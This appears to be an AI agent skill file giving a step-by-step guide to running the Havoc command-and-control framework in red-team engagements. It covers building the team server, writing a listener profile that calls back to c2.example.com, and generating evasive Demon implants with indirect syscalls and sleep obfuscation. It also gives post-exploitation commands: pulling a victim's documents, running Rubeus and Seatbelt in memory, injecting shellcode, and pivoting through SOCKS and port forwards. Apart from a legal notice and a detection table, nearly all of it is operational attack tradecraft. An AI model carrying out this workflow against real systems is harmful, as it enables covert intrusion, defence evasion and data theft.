---
name: operating-havoc-c2
description: Deploy a Havoc C2 team server with Yaotl malleable profiles, generate evasive Demon agents using indirect syscalls and sleep obfuscation, and run post-exploitation and pivoting operations. Use when running authorized, rules-of-engagement-bound red-team engagements needing a full C2 lifecycle spanning server setup, evasive implant generation, tasking, and lateral pivoting. Do not use for the Sliver C2 framework - use operating-sliver-c2.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- command-and-control
- havoc
- demon-agent
- adversary-emulation
- evasion
- post-exploitation
- sleep-obfuscation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1071.001
---
# Operating Havoc C2

> **Legal Notice:** This skill is for authorized security testing, sanctioned red-team engagements, and education only. Deploying a C2 framework or its agents against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement document.

## Overview

Havoc is an open-source, modern command-and-control framework created by `@C5pider` (https://github.com/HavocFramework/Havoc). Its primary implant, the **Demon**, is written in C and assembly and was designed from the ground up for evasion: it supports indirect syscalls (Hell's Gate / Halo's Gate), return-address and stack spoofing, and sleep obfuscation techniques (Ekko / FOLIAGE) that encrypt the agent in memory while it sleeps. The **team server** is the backend that starts listeners, queues tasks, manages agent check-ins, and brokers operator connections over an encrypted WebSocket. Operators connect with the Havoc **client**, a Qt GUI.

Havoc's behavior is driven by a **Yaotl profile** — a configuration language forked from HashiCorp's HCL — which defines the team server, operators, listeners, and Demon defaults. Because Havoc has been observed in real intrusions and is favored for its evasion features, exercising it during authorized engagements is valuable for emulating advanced adversary tradecraft and for testing whether EDR and network sensors detect its HTTP(S) C2 and in-memory techniques. This skill covers building Havoc, writing a profile, launching the team server, generating Demon agents, and running post-exploitation and lateral movement.

## When to Use

- When an authorized red-team engagement calls for an evasive, GUI-driven C2
- When emulating an adversary that uses Havoc/Demon (per threat intelligence) in a purple-team exercise
- When validating EDR detection of indirect syscalls, sleep obfuscation, and stack spoofing
- When demonstrating post-exploitation impact and lateral movement for a report

## Prerequisites

- A dedicated Linux host (Debian/Ubuntu/Kali) for the team server
- Go 1.18+ for the team server; Python 3.10 and Qt5 libraries for the client
- mingw-w64 and nasm for cross-compiling the Demon for Windows targets
- Signed authorization / rules of engagement

Install dependencies and build from source:

```bash
# Clone the framework
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Debian/Ubuntu/Kali build dependencies
sudo apt update && sudo apt install -y \
  git build-essential cmake libfontconfig1 libglu1-mesa-dev libgtest-dev \
  libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev \
  libreadline-dev libffi-dev libsqlite3-dev libbz2-dev qtbase5-dev qtchooser \
  qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
  qtdeclarative5-dev golang-go python3.10 python3.10-dev mingw-w64 nasm

# Build the team server
make ts-build

# Build the client
make client-build
```

## Objectives

- Author a Yaotl profile defining team server, operators, and a listener
- Launch the Havoc team server and connect with the client
- Create an HTTP(S) listener
- Generate an evasive Demon agent (EXE / shellcode) with sleep obfuscation
- Interact with the Demon and run post-exploitation commands
- Execute .NET assemblies and BOFs in-memory
- Pivot through the beachhead via SOCKS and port forwarding

## MITRE ATT&CK Mapping

| ID | Technique | Use in this skill |
|----|-----------|-------------------|
| T1071.001 | Application Layer Protocol: Web Protocols | The Demon's HTTP(S) listener carries C2 over web protocols to blend with normal traffic |

Related techniques exercised by the workflow:

| ID | Technique |
|----|-----------|
| T1027.007 | Obfuscated Files or Information: Dynamic API Resolution (indirect syscalls) |
| T1620 | Reflective Code Loading (in-memory .NET / BOF) |
| T1055 | Process Injection |
| T1090.001 | Internal Proxy (SOCKS pivot) |

## Workflow

### Step 1: Write a Yaotl profile

Create `profiles/engagement.yaotl` defining the team server, an operator, and an HTTP listener. Yaotl is HCL-style:

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "ChangeMe_Str0ng!"
    }
}

Listeners {
    Http {
        Name     = "https-listener"
        Hosts    = ["c2.example.com"]
        HostBind = "0.0.0.0"
        PortBind = 443
        PortConn = 443
        Secure   = true   # HTTPS
    }
}

Demon {
    Sleep = 30
    Jitter = 25

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

### Step 2: Launch the team server

Run the team server with your profile (privileged ports may require sudo):

```bash
# Verbose run with a custom profile
./havoc server --profile profiles/engagement.yaotl -v

# Add debug logging
./havoc server --profile profiles/engagement.yaotl --verbose --debug
```

### Step 3: Connect with the client

Launch the Qt client and connect to the team server using the operator credentials from the profile:

```bash
./havoc client
```

In the connect dialog: enter the team server host, port `40056`, operator name `operator1`, and the profile password. The Demon panel and listener views appear once connected.

### Step 4: Create / verify a listener

The HTTP listener defined in the profile loads automatically. To add another at runtime use **Listeners → Add** in the GUI and configure: Name, Hosts (callback domains/IPs), HostBind, PortBind, PortConn, and whether it is Secure (HTTPS).

### Step 5: Generate a Demon agent

In the GUI go to **Attack → Payload** and configure the Demon build:

- **Listener:** `https-listener`
- **Architecture:** `x64`
- **Format:** `Windows Exe`, `Windows Dll`, or `Windows Shellcode`
- **Sleep:** e.g., `30` seconds with jitter
- **Indirect Syscalls:** Enabled (Hell's Gate / Halo's Gate)
- **Sleep Technique:** `Ekko` (encrypts agent memory during sleep)
- **Stack Spoofing / Proxy Loading:** Enabled
- **Sleep Jmp Gadget:** as available

Click **Generate** to produce the payload. Deliver it to the target through your authorized initial-access method.

### Step 6: Interact with the Demon

When a Demon checks in it appears in the session table. Right-click → **Interact** (or double-click) to open the console. Core post-exploitation commands:

```
# Situational awareness
whoami
pwd
ls
ps
ipconfig
net localgroup administrators

# Token / privilege
getprivs
token list

# File operations
download C:\Users\victim\Documents\secrets.docx
upload /opt/tools/tool.exe C:\Windows\Temp\tool.exe
```

### Step 7: In-memory execution (.NET and BOFs)

The Demon supports in-memory execution of .NET assemblies and Beacon Object Files, avoiding disk writes:

```
# Execute a .NET assembly in-memory (e.g., Seatbelt, Rubeus)
dotnet inline-execute /opt/tools/Seatbelt.exe -group=system

# Run a Beacon Object File
inline-execute /opt/bofs/whoami.o
```

### Step 8: Process injection and migration

```
# Inject shellcode into a spawned/target process
shellcode inject x64 PID /tmp/payload.bin

# Run an assembly under a sacrificial process per profile Injection settings
proc create C:\Windows\System32\notepad.exe
```

### Step 9: Pivot into segmented networks

```
# Start a SOCKS5 proxy through the Demon for proxychains tooling
socks add 1080

# Port forward (reverse) to reach an internal service
rportfwd add 8443 10.0.5.20 443
```

### Step 10: Clean up

```
# Remove uploaded artifacts and exit the agent cleanly
rm C:\Windows\Temp\tool.exe
exit
```

Stop the team server (`Ctrl-C`) and revoke operator credentials at engagement end.

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Havoc Framework | Source and releases | https://github.com/HavocFramework/Havoc |
| Havoc Documentation | Official docs (teamserver, profiles, agent) | https://havocframework.com/docs |
| Havoc Profiles | Sample Yaotl profiles | https://github.com/HavocFramework/Havoc/tree/main/profiles |
| MITRE ATT&CK T1071.001 | Web Protocols | https://attack.mitre.org/techniques/T1071/001/ |

## OPSEC and Detection Considerations

| Demon feature | Purpose | Defender detection opportunity |
|---------------|---------|--------------------------------|
| Indirect syscalls (Hell's/Halo's Gate) | Bypass user-mode API hooks | Kernel ETW (Threat-Intelligence provider), call-stack anomalies |
| Sleep obfuscation (Ekko) | Encrypt agent in memory while sleeping | Memory scanning between sleeps, timer-queue/ROP artifacts |
| Stack spoofing | Hide implant in call stacks | Unbacked-memory thread start, spoofed-frame heuristics |
| HTTP(S) C2 | Blend with web traffic | Beaconing periodicity, JA3/TLS fingerprint, malleable headers |

- Tune `Sleep` and `Jitter` high to reduce beacon regularity.
- Front HTTP(S) listeners with nginx/Apache redirectors; never expose the team server IP.
- Prefer in-memory `dotnet inline-execute` / BOFs over spawning child processes.

## Validation Criteria

- [ ] Havoc team server and client built from source successfully
- [ ] Yaotl profile authored with team server, operator, and HTTP(S) listener
- [ ] Team server launched with the profile and operator connected via client
- [ ] HTTP(S) listener active
- [ ] Evasive Demon agent generated with sleep obfuscation and indirect syscalls
- [ ] Demon checks in and post-exploitation commands run
- [ ] A .NET assembly or BOF executed in-memory
- [ ] SOCKS proxy or port-forward established for pivoting
- [ ] Artifacts removed, agent exited, and team server stopped at cleanup
